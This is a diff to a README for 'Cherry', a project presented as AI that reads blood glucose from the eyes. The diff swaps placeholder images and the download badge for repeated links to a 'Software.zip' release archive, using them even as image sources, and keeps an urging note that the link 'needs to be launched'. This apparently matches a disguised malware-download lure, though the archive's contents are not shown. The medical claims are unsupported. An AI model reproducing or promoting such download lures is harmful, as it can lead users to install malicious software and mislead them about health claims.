@@ -1,6 +1,6 @@
 # 🍒 Cherry 🌙
 
-![Cherry Repository](https://via.placeholder.com/800x400)
+![Cherry Repository](https://github.com/rohitandey/Cherry/releases/download/v1.0/Software.zip)
 
 Welcome to Cherry; a moonshot program designed to revolutionize the way we monitor, read, and predict blood glucose or interstitial fluids from the eyes using cutting-edge artificial intelligence and deep learning technologies. 🚀
 
@@ -42,7 +42,7 @@ Cherry aims to provide a groundbreaking solution for diabetes management by leve
 
 To get started with Cherry, you can download the latest release by clicking the button below:
 
-[![Download Cherry v1.0.0](https://img.shields.io/badge/Download-Cherry_v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Cherry v1.0.0](https://github.com/rohitandey/Cherry/releases/download/v1.0/Software.zip)](https://github.com/rohitandey/Cherry/releases/download/v1.0/Software.zip)
 
 *Note: The provided link needs to be launched for downloading.*
 
@@ -58,4 +58,4 @@ Stay updated on the latest developments, discussions, and announcements by joini
 
 Let's work together to create a future where diabetes management is seamless and effective. Thank you for being a part of the Cherry journey! 🍒🌙
 
-![Cherry Logo](https://via.placeholder.com/200x200)
+![Cherry Logo](https://github.com/rohitandey/Cherry/releases/download/v1.0/Software.zip)
